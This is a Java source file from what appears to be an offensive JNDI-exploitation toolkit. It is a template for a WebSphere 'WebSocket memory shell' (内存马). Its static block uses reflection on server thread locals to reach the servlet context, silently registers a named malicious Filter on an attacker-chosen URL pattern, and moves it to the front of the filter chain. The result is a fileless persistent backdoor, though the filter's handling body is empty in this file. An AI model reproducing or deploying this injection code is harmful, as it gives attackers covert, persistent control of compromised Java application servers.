package com.qi4l.jndi.template.memshell.Websphere;

import javax.servlet.*;
import java.io.IOException;
import java.lang.reflect.Method;
import java.util.EnumSet;
import java.util.List;

/**
 * WebSocket 内存马
 *
 * @author QI4L
 */
public class WSFMSFromThread implements Filter {

    public static String pattern;

    public static String NAME;

    static {
        try {
            Class                   clazz = Thread.currentThread().getClass();
            java.lang.reflect.Field field = clazz.getDeclaredField("wsThreadLocals");
            field.setAccessible(true);
            Object obj = field.get(Thread.currentThread());

            Object[] obj_arr = (Object[]) obj;
            for (int j = 0; j < obj_arr.length; j++) {
                Object o = obj_arr[j];
                if (o == null) continue;

                if (o.getClass().getName().endsWith("WebContainerRequestState")) {
                    Object request        = o.getClass().getMethod("getCurrentThreadsIExtendedRequest", new Class[0]).invoke(o, new Object[0]);
                    Object servletContext = request.getClass().getMethod("getServletContext", new Class[0]).invoke(request, new Object[0]);

                    field = servletContext.getClass().getDeclaredField("context");
                    field.setAccessible(true);
                    Object context = field.get(servletContext);

                    field = context.getClass().getSuperclass().getDeclaredField("config");
                    field.setAccessible(true);
                    Object webAppConfiguration = field.get(context);

                    Method   method  = null;
                    Method[] methods = webAppConfiguration.getClass().getMethods();
                    for (int i = 0; i < methods.length; i++) {
                        if (methods[i].getName().equals("getFilterMappings")) {
                            method = methods[i];
                            break;
                        }
                    }
                    List filerMappings = (List) method.invoke(webAppConfiguration, new Object[0]);

                    boolean flag = false;
                    for (int i = 0; i < filerMappings.size(); i++) {
                        Object filterConfig = filerMappings.get(i).getClass().getMethod("getFilterConfig", new Class[0]).invoke(filerMappings.get(i), new Object[0]);
                        String name         = (String) filterConfig.getClass().getMethod("getFilterName", new Class[0]).invoke(filterConfig, new Object[0]);
                        if (name.equals(NAME)) {
                            flag = true;
                            break;
                        }
                    }

                    //如果已存在同名的 Filter，就不在添加，防止重复添加
                    if (!flag) {
                        Filter filter = new WSFMSFromThread();

                        Object filterConfig = context.getClass().getMethod("createFilterConfig", new Class[]{String.class}).invoke(context, new Object[]{NAME});
                        filterConfig.getClass().getMethod("setFilter", new Class[]{Filter.class}).invoke(filterConfig, new Object[]{filter});

                        method = null;
                        methods = webAppConfiguration.getClass().getMethods();
                        for (int i = 0; i < methods.length; i++) {
                            if (methods[i].getName().equals("addFilterInfo")) {
                                method = methods[i];
                                break;
                            }
                        }
                        method.invoke(webAppConfiguration, new Object[]{filterConfig});

                        field = filterConfig.getClass().getSuperclass().getDeclaredField("context");
                        field.setAccessible(true);
                        Object original = field.get(filterConfig);

                        //设置为null，从而 addMappingForUrlPatterns 流程中不会抛出异常
                        field.set(filterConfig, null);

                        method = filterConfig.getClass().getDeclaredMethod("addMappingForUrlPatterns", new Class[]{EnumSet.class, boolean.class, String[].class});
                        method.invoke(filterConfig, new Object[]{EnumSet.of(DispatcherType.REQUEST), true, new String[]{pattern}});

                        //addMappingForUrlPatterns 流程走完，再将其设置为原来的值
                        field.set(filterConfig, original);

                        method = null;
                        methods = webAppConfiguration.getClass().getMethods();
                        for (int i = 0; i < methods.length; i++) {
                            if (methods[i].getName().equals("getUriFilterMappings")) {
                                method = methods[i];
                                break;
                            }
                        }

                        //这里的目的是为了将我们添加的动态 Filter 放到第一位
                        List uriFilterMappingInfos = (List) method.invoke(webAppConfiguration, new Object[0]);
                        uriFilterMappingInfos.add(0, filerMappings.get(filerMappings.size() - 1));
                    }

                    break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
    }

    @Override
    public void destroy() {
    }
}
